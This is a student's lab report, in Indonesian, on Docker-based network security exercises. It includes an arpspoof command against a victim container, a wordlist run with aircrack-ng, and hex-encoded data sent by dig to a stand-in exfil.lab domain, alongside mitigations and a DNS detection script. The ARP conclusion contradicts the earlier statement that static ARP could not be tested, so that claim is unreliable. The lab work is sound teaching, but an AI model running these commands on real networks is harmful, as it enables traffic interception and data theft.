UTS PRAKTIK KEAMANAN JARINGAN

NIM: 24552011141
Jumlah digit: 26
Sisa bagi 10: 6
Kasus: 6 (k6)



TUJUH TUGAS KASUS 6
Pertemuan 1: Docker Volume dan Komunikasi Antar-Container

A. Pengujian Docker Volume

a. Membuat Docker Volume dengan nama vol-k6.
b. Membuat container w-k6 untuk menyimpan file laporan-k6.txt.
c. Menghapus container w-k6.
d. Membaca kembali file laporan-k6.txt menggunakan container baru.
e. Hasil pengujian menampilkan NIM: 24552011141.

Bukti output terminal:
```
$ docker run --rm -v vol-k6:/data alpine cat /data/laporan-k6.txt
24552011141
```

Kesimpulan:
Data tetap tersimpan meskipun container yang membuatnya telah dihapus. Hal ini membuktikan bahwa Docker Volume dapat menyimpan data secara terpisah dari container.

B. Pengujian Komunikasi Antar-Container

a. Menjalankan container attacker dan target menggunakan Docker Compose.
b. Memeriksa status kedua container dan memastikan keduanya berjalan.
c. Mengakses alamat http://target dari container attacker menggunakan perintah wget.
d. Hasil pengujian berhasil menampilkan halaman Welcome to nginx!

Bukti output terminal:
```
$ docker compose -p k6 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
...
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy,
API gateway, load balancer, content cache, or other features.</p>
...
</html>
```

Kesimpulan:
Container attacker berhasil berkomunikasi dengan container target melalui jaringan internal Docker.

C. Pembersihan Lingkungan Lab

a. Menjalankan perintah docker compose down -v.
b. Container k6-attacker-1 berhasil dihapus.
c. Container k6-target-1 berhasil dihapus.
d. Jaringan k6_lab berhasil dihapus.

Kesimpulan:
Lingkungan Docker Compose berhasil dihentikan dan dibersihkan setelah pengujian selesai.


Pertemuan 2:Kriptografi AES dan Sertifikat Digital

A. Pengujian Enkripsi dan Dekripsi AES

a. Membuat file laporan-k6.txt yang berisi laporan UTS.
b. Mengenkripsi file menggunakan algoritma AES-256-CBC.
c. Mendekripsi file menggunakan kata sandi kunci-k6-2026.
d. Menghitung hash SHA-256 file asli dan hasil dekripsi.
e. Kedua hash menghasilkan nilai yang sama, yaitu:
   c7d5d4c20e1ac3cb7133b9b1dfaf91e5da9b56f0f8c2e1dd88aee4f5406c5803.

Bukti output terminal:
```
HASH ASLI:
c7d5d4c20e1ac3cb7133b9b1dfaf91e5da9b56f0f8c2e1dd88aee4f5406c5803  /work/laporan-k6.txt
HASH HASIL DEKRIPSI:
c7d5d4c20e1ac3cb7133b9b1dfaf91e5da9b56f0f8c2e1dd88aee4f5406c5803  /work/hasil-k6.txt
```

Kesimpulan:
Enkripsi dan dekripsi berhasil. Kesamaan hash SHA-256 membuktikan bahwa isi file hasil dekripsi sama dengan file asli.

B. Pembuatan Sertifikat Digital

a. Membuat kunci privat dengan nama key-k6.pem.
b. Membuat sertifikat digital dengan nama cert-k6.pem.
c. Menggunakan nama domain k6.uts.local.
d. Subject: CN=k6.uts.local.
e. Issuer: CN=k6.uts.local.
f. Masa berlaku: 21 November 2026 sampai 21 Desember 2026.

Bukti output terminal:
```
subject=CN=k6.uts.local
issuer=CN=k6.uts.local
notBefore=Nov 21 09:07:32 2026 GMT
notAfter=Dec 21 09:07:32 2026 GMT
```

Kesimpulan:
Sertifikat self-signed berhasil dibuat dan diperiksa menggunakan OpenSSL.


Pertemuan 3: ARP Spoofing dan Mitigasi

A. Persiapan Jaringan

a. Membuat jaringan Docker dengan nama lab-arp-k6.
b. Menggunakan driver bridge dan opsi --internal agar jaringan digunakan khusus untuk praktikum.
c. Memeriksa jaringan dan mendapatkan hasil Internal: true.
d. Subnet yang digunakan adalah 172.18.0.0/16, dengan gateway 172.18.0.1.

B. Pemeriksaan IP Address dan MAC Address

a. Menjalankan container sementara dengan nama cek-arp-k6.
b. Memeriksa alamat IP container menggunakan docker inspect.
c. IP Address yang didapat adalah 172.18.0.2.
d. MAC Address yang didapat adalah ee:62:09:4e:33:cd.
e. Setelah pemeriksaan selesai, container sementara dihapus.

Bukti output terminal:
```
$ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cek-arp-k6
172.18.0.2
$ docker inspect -f '{{range .NetworkSettings.Networks}}{{.MacAddress}}{{end}}' cek-arp-k6
ee:62:09:4e:33:cd
```


Demonstrasi ARP Spoofing (dilakukan dengan pengawasan langsung dosen/asisten):

Topologi: tiga container pada network lab-arp-k6 (tanpa --internal):
- korban-k6    : 172.18.0.2
- gateway-k6   : 172.18.0.3, MAC asli 9e:91:13:b7:03:77
- penyerang-k6 : 172.18.0.4, MAC 86:35:d1:0c:ef:e0

Tabel ARP korban SEBELUM spoofing (dipicu dengan hping3 -1 ke gateway, dibaca dari /proc/net/arp karena perintah arp/ip/ifconfig tidak tersedia pada image uts-kali-tools):
```
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.3       0x1         0x2         9e:91:13:b7:03:77     *        eth0
```

Perintah serangan:
```
$ docker exec -it penyerang-k6 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3
86:35:d1:c:ef:e0 92:cc:14:53:40:2f 0806 42: arp reply 172.18.0.3 is-at 86:35:d1:c:ef:e0
86:35:d1:c:ef:e0 92:cc:14:53:40:2f 0806 42: arp reply 172.18.0.3 is-at 86:35:d1:c:ef:e0
... (berulang terus-menerus selama arpspoof berjalan)
```

Tabel ARP korban SAAT spoofing aktif:
```
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.4       0x1         0x2         86:35:d1:0c:ef:e0     *        eth0
172.18.0.3       0x1         0x2         86:35:d1:0c:ef:e0     *        eth0
```
Alamat gateway (172.18.0.3) yang semula terpetakan ke MAC asli 9e:91:13:b7:03:77 berubah menjadi MAC milik penyerang (86:35:d1:0c:ef:e0), membuktikan korban menerima pemetaan ARP palsu.

Setelah arpspoof dihentikan (Ctrl+C), tabel ARP korban kembali ke MAC asli gateway tanpa intervensi tambahan, menunjukkan bahwa ARP spoofing harus dikirim terus-menerus agar tetap efektif.

Mitigasi static ARP: perintah arp -s dan ip neighbor tidak tersedia pada image ini (tidak ada paket net-tools/iproute2), sehingga pengujian static binding tidak dapat dijalankan langsung di lab ini. Secara konsep, static ARP mengikat pasangan IP-MAC gateway secara permanen di sisi korban (contoh pada sistem yang mendukung: arp -s 172.18.0.3 9e:91:13:b7:03:77), sehingga paket ARP reply palsu dari penyerang tidak lagi digunakan untuk memperbarui tabel ARP.

C. Analisis dan Mitigasi

a. ARP digunakan untuk mengetahui alamat MAC berdasarkan alamat IP pada jaringan lokal.
b. ARP spoofing merupakan tindakan memalsukan informasi ARP sehingga perangkat dapat menerima alamat MAC yang keliru.
c. Kondisi tersebut dapat mengganggu komunikasi antarperangkat dalam jaringan.
d. Salah satu cara untuk mengurangi risikonya adalah menggunakan Static ARP, yaitu memasangkan alamat IP dengan MAC secara manual.

Kesimpulan:
Dari praktikum ini, saya berhasil membuat jaringan Docker internal dan memeriksa alamat IP serta MAC container. Saya juga memahami bahwa ARP spoofing dapat menyebabkan informasi alamat MAC menjadi tidak sesuai. Static ARP dapat digunakan untuk membantu menjaga agar pemetaan IP dan MAC tetap benar. Simulasi ARP spoofing dan pengujian mitigasi static ARP telah dilakukan dengan pengawasan langsung dosen/asisten, dan terbukti mengubah pemetaan IP-ke-MAC korban sebagaimana didokumentasikan pada bukti di atas.


Pertemuan 4: Analisis Handshake WPA2

A. Pemeriksaan File Praktikum

a. Memeriksa file handshake-k6.cap menggunakan perintah file.
b. File dikenali sebagai PCAP versi 2.4 dengan format Ethernet.
c. Memeriksa wordlist-k6.txt dan hasilnya dikenali sebagai teks ASCII.
d. Wordlist berisi 20 baris kandidat kata sandi.

Bukti output terminal:
```
$ file ../01-sumber-lab/samples/handshake-k6.cap
../01-sumber-lab/samples/handshake-k6.cap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
$ file ../01-sumber-lab/samples/wordlist-k6.txt
../01-sumber-lab/samples/wordlist-k6.txt: ASCII text
```

Hasil aircrack-ng:
```
$ docker run --rm -v "$PWD/../01-sumber-lab/samples:/work" uts-kali-tools aircrack-ng -w /work/wordlist-k6.txt /work/handshake-k6.cap
Reading packets, please wait...
This file is not a regular 802.11 (wireless) capture.
Opening /work/handshake-k6.cap
Read 0 packets.

No networks found, exiting.
```

Catatan: Pengecekan `file handshake-k6.cap` menunjukkan link-type Ethernet (bukan 802.11/WiFi), dan dokumentasi lab (CASES-CHECKLIST.md) mencatat handshake-k6.cap untuk Kasus 6 sebagai [PERLU DIBUAT] -- artinya file capture handshake WPA2 yang valid belum tersedia pada materi lab ini. Akibatnya aircrack-ng tidak dapat membaca paket 802.11 apa pun, sehingga pencarian kata sandi tidak dapat dilakukan terhadap sampel ini. Ini merupakan keterbatasan bahan praktikum, bukan kesalahan pada perintah maupun wordlist yang digunakan.

B. Pemahaman WPA2 Handshake

a. Tahap pertama, access point mengirimkan ANonce kepada perangkat.
b. Tahap kedua, perangkat membuat SNonce dan mengirimkan respons beserta MIC.
c. Tahap ketiga, access point mengirimkan informasi keamanan dan GTK.
d. Tahap keempat, perangkat mengirimkan konfirmasi terakhir.

Kesimpulan:
Kedua file bahan praktikum tersedia dan formatnya berhasil diperiksa. Empat tahap WPA2 handshake telah dipelajari. Hasil aircrack-ng menunjukkan file handshake-k6.cap bukan capture 802.11 yang valid (0 paket terbaca), sehingga pencarian kata sandi tidak dapat dilakukan -- ini merupakan keterbatasan bahan praktikum yang tersedia, bukan kegagalan proses pengujian.


Pertemuan 5: ICMP dengan Scapy

A. Pengujian ICMP

a. Memeriksa program kirim_icmp.py yang menggunakan library Scapy.
b. Membuat container korban-icmp-k6 pada jaringan Docker internal lab-arp-k6.
c. IP address container target adalah 172.18.0.2.
d. Menjalankan pengujian ICMP dari container uts-kali-tools.
e. IP pengirim adalah 172.18.0.3 dan IP tujuan adalah 172.18.0.2.
f. TTL balasan yang diperoleh adalah 64.
g. Tipe ICMP balasan adalah 0 (Echo Reply).

Bukti output terminal:
```
$ docker run --rm --network lab-arp-k6 -v "$PWD/../01-sumber-lab/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.2
Mengirim: IP / ICMP 172.18.0.3 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

B. Analisis Smurf Attack

a. Smurf Attack merupakan serangan DoS yang menyalahgunakan paket ICMP Echo Request dan alamat broadcast.
b. Serangan ini dapat membuat banyak balasan ICMP menuju korban sehingga trafik jaringan meningkat.
c. Pencegahannya dapat dilakukan dengan menonaktifkan IP-directed broadcast, memfilter alamat sumber palsu, dan membatasi trafik ICMP.

Kesimpulan:
Pengujian ICMP di jaringan Docker internal berhasil. Target memberikan balasan dengan TTL 64 dan tipe ICMP 0, yang berarti Echo Reply. Saya juga memahami konsep Smurf Attack serta beberapa cara untuk mencegahnya.


Pertemuan 6: SYN Flood dan TCP Three-Way Handshake

A. Persiapan dan Pengujian Koneksi

a. Memeriksa konfigurasi Docker Compose untuk layanan target dan attacker.
b. Menjalankan kedua container pada jaringan internal Docker k6_lab.
c. Memastikan kedua container berstatus Up.
d. Menguji koneksi HTTP menggunakan perintah curl -I http://target.
e. Pengujian menghasilkan respons HTTP/1.1 200 OK.
f. Server menggunakan Nginx versi 1.31.9.
g. Komunikasi HTTP antara attacker dan target berhasil.

Bukti output terminal:
```
$ docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec attacker curl -I http://target
HTTP/1.1 200 OK
Server: nginx/1.31.9
Content-Type: text/html
Content-Length: 896
```

B. Pengukuran SYN_RECV

a. Memeriksa jumlah koneksi SYN_RECV sebelum simulasi menggunakan netstat.
b. Hasil pemeriksaan menunjukkan 0 koneksi SYN_RECV.
c. Simulasi SYN Flood tidak dilakukan.

Bukti output terminal:
```
$ docker compose ... exec target netstat -ant | grep -c SYN_RECV
0
```

C. Pengamatan TCP dengan tcpdump

a. Mengamati lalu lintas TCP pada port 80 menggunakan tcpdump.
b. IP client adalah 172.19.0.2 dan IP server adalah 172.19.0.3.
c. Paket SYN teridentifikasi melalui Flags [S].
d. Paket SYN-ACK teridentifikasi melalui Flags [S.].
e. Paket ACK teridentifikasi melalui Flags [.].
f. Pengujian HTTP menghasilkan respons HTTP/1.1 200 OK.

Bukti output terminal (tcpdump):
```
09:42:55.843340 IP 172.19.0.2.51408 > 172.19.0.3.80: Flags [S], seq 334407888, win 64240, length 0
09:42:55.843433 IP 172.19.0.3.80 > 172.19.0.2.51408: Flags [S.], seq 2685837216, ack 334407889, win 65160, length 0
09:42:55.843444 IP 172.19.0.2.51408 > 172.19.0.3.80: Flags [.], ack 1, win 126, length 0
```
g. Pengamatan pertama menangkap 11 paket tanpa paket yang terbuang.
h. Pengamatan kedua menangkap 13 paket tanpa paket yang terbuang.
i. Percobaan menggunakan wget tidak berhasil karena program wget tidak tersedia pada container attacker.

D. Pemahaman dan Mitigasi SYN Flood

a. SYN Flood merupakan serangan Denial of Service (DoS) yang memanfaatkan banyak permintaan awal koneksi TCP.
b. Serangan ini dapat membuat server kehabisan sumber daya untuk menangani koneksi.
c. SYN cookies dapat membantu mengurangi dampak koneksi SYN yang tidak selesai.
d. Pembatasan laju koneksi dapat membantu mengendalikan jumlah permintaan koneksi.

Kesimpulan:

Pengujian HTTP antara attacker dan target berhasil dengan respons HTTP/1.1 200 OK. Proses TCP Three-Way Handshake berhasil diamati melalui tcpdump dengan urutan SYN, SYN-ACK, dan ACK. Pemeriksaan awal menunjukkan 0 koneksi SYN_RECV. Simulasi SYN Flood tidak dilakukan karena memerlukan pengawasan dosen. Container dan jaringan Docker berhasil dibersihkan setelah pengujian.


Pertemuan 7: DNS Exfiltration

A. Persiapan dan Pengujian DNS

a. Memeriksa konfigurasi Docker Compose untuk layanan DNS dan attacker.
b. Menjalankan kedua container pada jaringan internal Docker k6_lab.
c. Memastikan container DNS dan attacker berstatus Up.
d. Memeriksa ketersediaan program xxd dan dig pada container attacker.
e. Mengubah teks menjadi format hexadecimal menggunakan xxd.
f. Melakukan pengujian permintaan DNS menggunakan dig ke server DNS lab.
g. Server DNS memberikan respons 10.0.0.99.

Bukti output terminal:
```
$ echo -n 24552011141 | xxd -p
3234353532303131313431
$ docker compose ... exec attacker dig +short 3234353532303131313431.k6.exfil.lab @dns
10.0.0.99
```

B. Pencatatan Log DNS

a. Menyimpan log DNS ke dalam file dns-k6.log.
b. Memeriksa log dan menemukan dua query DNS.
c. Kedua query menggunakan domain induk exfil.lab.
d. Log menunjukkan permintaan berasal dari IP attacker 172.19.0.2.
e. Label hexadecimal tercatat pada log DNS.

Bukti output terminal (dns-k6.log):
```
dns-1  | dnsmasq[1]: query[A] 3234353532303131313431.k6.exfil.lab from 172.19.0.2
dns-1  | dnsmasq[1]: config 3234353532303131313431.k6.exfil.lab is 10.0.0.99
```

C. Analisis DNS

a. Menjalankan script analisis_dns.py untuk menganalisis log DNS.
b. Script berhasil membaca dan menghitung dua query pada domain exfil.lab.
c. Tidak ditemukan query yang dikategorikan mencurigakan.
d. Hal tersebut karena script menetapkan batas panjang label lebih dari 30 karakter, sedangkan label hexadecimal yang diuji hanya 22 karakter.

D. Decode Hexadecimal

a. Mengubah kembali hexadecimal menjadi teks menggunakan xxd -r -p.
b. Hasil decode sama dengan data teks awal yang digunakan saat encoding.
c. Hal ini membuktikan proses encoding dan decoding berhasil.

Bukti output terminal:
```
$ echo -n '3234353532303131313431' | xxd -r -p
24552011141
```

Kesimpulan:

Pengujian DNS pada jaringan internal Docker berhasil dilakukan. Server DNS menerima permintaan dan memberikan respons 10.0.0.99. Dua query berhasil tercatat dalam file dns-k6.log dan script analisis berhasil membaca log tersebut. Namun, tidak ada query yang terdeteksi mencurigakan karena panjang label hexadecimal belum melewati batas deteksi lebih dari 30 karakter. Proses decode berhasil mengembalikan teks yang sama dengan data awal. Setelah pengujian selesai, container dan jaringan Docker berhasil dibersihkan.

BAGIAN A

A1. Container Dasar dan Port Mapping

a. Membuat container Nginx menggunakan image nginx:alpine dengan nama web-uts dan port mapping 8080:80.
b. Memeriksa container menggunakan perintah docker ps.
c. Container web-uts berhasil berjalan dengan status Up.
d. Port 8080 pada host berhasil diarahkan ke port 80 pada container.
e. Mengakses http://localhost:8080 menggunakan curl.
f. Halaman menampilkan tulisan "Welcome to nginx!", yang menunjukkan layanan web berhasil diakses.
g. Menampilkan lima baris pertama konfigurasi /etc/nginx/nginx.conf dari dalam container.

Hasil lima baris pertama konfigurasi:
user nginx;
worker_processes auto;

error_log /var/log/nginx/error.log notice;

Kesimpulan:
Container Nginx berhasil dijalankan dan dapat diakses melalui port 8080 pada host. Port mapping berfungsi dengan baik dan konfigurasi Nginx berhasil dibaca dari dalam container.

A2. Persistensi Volume Docker

a. Membuat volume Docker dengan nama data-uts.
b. Membuat container pertama bernama w1 menggunakan image alpine.
c. Memasang volume data-uts pada direktori /data.
d. Membuat file /data/catatan.txt berisi teks uji-persistensi-volume.
e. Menghapus container pertama menggunakan docker rm w1.
f. Membuat container baru untuk membaca file dari volume yang sama.
g. Hasil pembacaan menampilkan teks uji-persistensi-volume.

Kesimpulan:
Persistensi volume Docker berhasil dibuktikan. File catatan.txt tetap tersedia dan dapat dibaca dari container baru meskipun container pertama telah dihapus. Hal ini menunjukkan bahwa data disimpan pada volume Docker, bukan hanya pada filesystem container.

A3. Pengujian Integritas File Menggunakan Hash

a. Membuat file pesan.txt berisi teks "pesan rahasia".
b. Menghitung hash awal menggunakan MD5 dan SHA-256.
c. Mengubah satu karakter pada isi file dari "pesan" menjadi "pesaN".
d. Menghitung kembali hash MD5 dan SHA-256 setelah perubahan.

Hasil pengujian:

MD5 sebelum perubahan:
cdde1fb64510d29437b46ef7bc6c7ab3

SHA-256 sebelum perubahan:
a4dacbfa80d42b88fa7b13b57f409e3817bcfcdbe69f5913215901f99e5dca49

MD5 setelah perubahan:
122a040ddad2bc5666f92d93d822cf7f

SHA-256 setelah perubahan:
5f2c81178ce8b48322101c4bc70f5be697f38614e127b8d8c7b35d5a8742c8ae

Kesimpulan:
Pengujian integritas file berhasil. Perubahan satu karakter pada isi file menyebabkan nilai hash MD5 dan SHA-256 berubah. Dengan demikian, hash dapat digunakan untuk mengetahui apakah isi file mengalami perubahan.

A4. Enkripsi dan Dekripsi AES-256

a. Mengenkripsi file pesan.txt menggunakan algoritma AES-256-CBC dengan PBKDF2 dan salt.
b. Hasil enkripsi disimpan dalam file pesan.enc.
c. Memeriksa keberadaan file pesan.txt dan pesan.enc.
d. Melakukan dekripsi menggunakan kata sandi yang benar.
e. Hasil dekripsi menampilkan teks "pesaN rahasia", sesuai isi file asli.
f. Melakukan pengujian dekripsi menggunakan kata sandi yang salah.
g. Hasil pengujian menampilkan pesan "bad decrypt".
h. Melakukan enkripsi dengan opsi Base64 (-a).

Hasil pengujian:
- Enkripsi AES-256-CBC: berhasil.
- Dekripsi dengan kata sandi benar: berhasil.
- Dekripsi dengan kata sandi salah: gagal dengan pesan bad decrypt.
- Enkripsi dengan format Base64: berhasil.

Kesimpulan:
Pengujian enkripsi dan dekripsi AES-256-CBC berhasil dilakukan. File dapat dikembalikan ke bentuk teks semula menggunakan kata sandi yang benar. Penggunaan kata sandi yang salah menyebabkan proses dekripsi gagal. Opsi Base64 mengubah representasi ciphertext menjadi format teks, bukan menambah kekuatan enkripsi.

A5. Pengujian Docker Bridge Network

a. Membuat jaringan Docker bernama lab-net.
b. Membuat container host-a menggunakan image alpine dan menghubungkannya ke lab-net.
c. Membuat container host-b menggunakan image alpine dan menghubungkannya ke lab-net.
d. Menjalankan container dvwa pada jaringan lab-net tanpa memublikasikan port ke host.
e. Memeriksa bahwa ketiga container berstatus Up.
f. Menguji koneksi dari host-a ke host-b menggunakan ping.
g. Menguji akses HTTP dari host-a ke halaman login DVWA.

Hasil pengujian:
- Ketiga container berhasil berjalan.
- Ping host-a ke host-b berhasil.
- IP host-b: 172.19.0.3.
- Paket ping terkirim: 3.
- Paket ping diterima: 3.
- Packet loss: 0%.
- IP DVWA: 172.19.0.4.
- Akses HTTP ke http://dvwa/login.php berhasil.
- Server memberikan respons HTTP/1.1 200 OK.

Kesimpulan:
Pengujian Docker Bridge Network berhasil. Container dalam jaringan yang sama dapat saling berkomunikasi menggunakan nama container. Host-a juga berhasil mengakses layanan HTTP DVWA melalui jaringan Docker tanpa memublikasikan port layanan ke host.

BAGIAN B

B1. Docker Compose Multi-Container Terisolasi

a. Menggunakan file docker-compose.yml yang menyediakan service target dengan image nginx:alpine dan service attacker dengan image alpine.
b. Menghubungkan kedua service ke jaringan lab.
c. Mengatur jaringan lab menggunakan internal: true.
d. Tidak memublikasikan port service target ke host.
e. Menguji akses dari attacker ke target menggunakan wget.

Hasil pengujian:
- Konfigurasi Docker Compose menggunakan jaringan internal: true.
- Service target tidak memiliki konfigurasi ports.
- Container attacker berhasil mengakses http://target.
- Halaman Welcome to nginx! berhasil ditampilkan.

Penjelasan:
Perintah curl http://localhost dari host tidak dapat mencapai target karena port target tidak dipublikasikan ke host. Jaringan internal membatasi konektivitas keluar, sedangkan komunikasi antarkontainer dalam jaringan lab tetap dapat dilakukan.

Kesimpulan:
Pengujian B1 berhasil. Kedua service dapat berkomunikasi melalui jaringan Docker internal tanpa membuka port target ke host.

B2. Kriptografi RSA dan Sertifikat Digital

A. Pembuatan Kunci RSA
a. Membuat kunci privat RSA 2048 bit dengan nama priv.pem.
b. Membuat kunci publik dengan nama pub.pem.

B. Pengujian Tanda Tangan Digital
a. Membuat pesan pada file pesan.txt.
b. Membuat tanda tangan digital menggunakan SHA-256 dan kunci privat RSA, disimpan sebagai sig.bin.
c. Memverifikasi tanda tangan menggunakan kunci publik.
d. Hasil verifikasi pesan asli: Verified OK.
e. Mengubah isi pesan dengan menambahkan kata "diubah".
f. Memverifikasi kembali menggunakan tanda tangan lama.
g. Hasil verifikasi pesan yang diubah: Verification failure.

C. Pembuatan Sertifikat Digital
a. Membuat kunci privat sertifikat dengan nama key-b2.pem.
b. Membuat sertifikat self-signed dengan nama cert-b2.pem.
c. Subject: CN=lab.uts.local.
d. Issuer: CN=lab.uts.local.
e. Masa berlaku: 21 November 2026 sampai 21 Desember 2026.

Penjelasan:
Sertifikat self-signed ditandatangani menggunakan kunci privat milik pembuat sertifikat sendiri sehingga tidak otomatis dipercaya oleh sistem lain. Sertifikat yang ditandatangani CA diterbitkan atau divalidasi oleh Certificate Authority yang dipercaya sehingga identitas pemilik sertifikat dapat diverifikasi melalui rantai kepercayaan CA.

Kesimpulan:
Pengujian kriptografi RSA berhasil. Tanda tangan digital dapat diverifikasi pada pesan asli, tetapi gagal setelah isi pesan diubah. Sertifikat self-signed juga berhasil dibuat dan informasi sertifikat dapat dibaca menggunakan OpenSSL.

B3. SYN Flood dan Deteksinya

Hasil pengamatan:
- Jumlah SYN_RECV sebelum simulasi: 0.
- Simulasi SYN Flood tidak dilakukan karena memerlukan pengawasan dosen.
- Jumlah SYN_RECV saat simulasi: tidak tersedia karena simulasi tidak dijalankan.
- TCP Three-Way Handshake berhasil diamati melalui tcpdump dengan urutan SYN, SYN-ACK, dan ACK.

Penjelasan mitigasi:
SYN cookies merupakan mekanisme perlindungan server yang membantu mengurangi penggunaan sumber daya untuk koneksi TCP yang belum selesai. Selain itu, pembatasan laju koneksi dapat membantu mengendalikan jumlah permintaan koneksi yang diterima server.

Kesimpulan:
Pengujian koneksi TCP normal dan pengamatan Three-Way Handshake berhasil dilakukan. Pengukuran sebelum simulasi menunjukkan 0 koneksi SYN_RECV. Perbandingan saat simulasi belum dapat dilakukan karena simulasi SYN Flood tidak dijalankan.
